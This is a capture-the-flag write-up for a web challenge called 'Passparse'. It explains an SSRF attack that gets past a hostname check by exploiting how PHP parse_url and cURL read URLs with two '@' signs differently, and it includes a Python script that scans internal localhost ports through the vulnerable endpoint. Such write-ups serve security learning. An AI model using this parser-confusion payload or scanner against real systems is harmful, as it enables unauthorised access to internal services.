# Passparse (web 500)

### overview
We were given a web app that sends a request to the server using axios via a button :

[http://passparser.web.ctf.shellmates.club/verify.php?url=URL_HERE](http://passparser.web.ctf.shellmates.club/verify.php?url=URL_HERE)

We first had to bypass the hostname check using well known techniques but no one worked and we continue had a message saying "You don't have permission".

Then we though it was an HTTP Splitting attack due to the response when sending a CRLF at the end of the URL.

But at the end we had to re-read the JS code with a comment 'update cURL !', so we started fetching for CURL PHP URL parsing conflicts and we end up in this article [https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf).

### the attack

So the vulnerability was that when sending this format of url :
```
http://random@rabbit.com:80@zion.com/
```
in PHP when using parse_url function to get the host it will get the last one **zion.com**, but in cURL it will take the first one **rabbit.com**
```
http:// random @ 127.0.0.1:80 @ passparser.web.ctf.shellmates.club/
                |____________|   |______________________________|
                     |                          |
                    cURL                    PHP parse_url
```
So we then just had to fetch for internal services by changing ports, here is the script:
```python
import requests

url = "http://passparser.web.ctf.shellmates.club/verify.php?url=http://a@127.0.0.1:{}@passparser.web.ctf.shellmates.club/"
headers = {
		"Accept": "application/json, text/plain, */*",
		"X-Auth-Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
		"Referer": "http://passparser.web.ctf.shellmates.club/",
		"Accept-Encoding": "gzip, deflate",
		"Accept-Language": "en-US,en;q=0.9",
		"Connection": "close"}
for x in range(31):
    port = f"90{str(x).zfill(2)}"
    print(f'Trying port {port}')
    try:
        r = requests.get(url.format(port), headers=headers, timeout=2)
    except requests.exceptions.ReadTimeout:
        continue
    if len(r.text) != 13:
        print(r.text)
        break
    else:
        continue

```


~ **J4ck** alias **fncf0x**
